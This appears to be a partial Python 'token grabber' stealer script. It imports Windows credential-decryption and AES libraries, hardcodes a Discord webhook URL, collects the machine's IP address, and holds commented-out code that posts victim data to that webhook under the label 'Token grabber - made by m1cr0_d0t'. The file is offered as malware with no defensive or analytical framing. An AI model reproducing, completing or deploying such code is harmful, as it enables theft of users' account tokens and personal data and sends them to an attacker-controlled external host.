from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import json
from urllib import request as r
from urllib.error import HTTPError
from time import sleep as s

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
print(s.getsockname()[0])
s.close()

WEBHOOK_URL = 'https://discord.com/api/webhooks/1242456274243686430/knPaXCoJ4zBjJLyGFDDCx6v3AQfBpaIxqSxUK5QvEGBpWrjglBZWOSRWfzBtwE1K0c6d'
embed = []

headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Firefox/126.0.0.0 Safari/537.11'
    }

import socket
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
print(ip)

# payload = {
#     'content': f'{ip}\n{response}', 'username': 'Token grabber - made by m1cr0_d0t'
# }
#
# req = Request(url=WEBHOOK_URL, data=json.dumps(payload).encode(), headers=headers, method='POST')
# try:
#     re = urlopen(req)
#     print(re.status)
#     print(re.status)
#     print(re.status)
# except HTTPError as e:
#     print('ERROR')
#     print(e.reason)
#     print(e.hdrs)
#     print(e.file.read())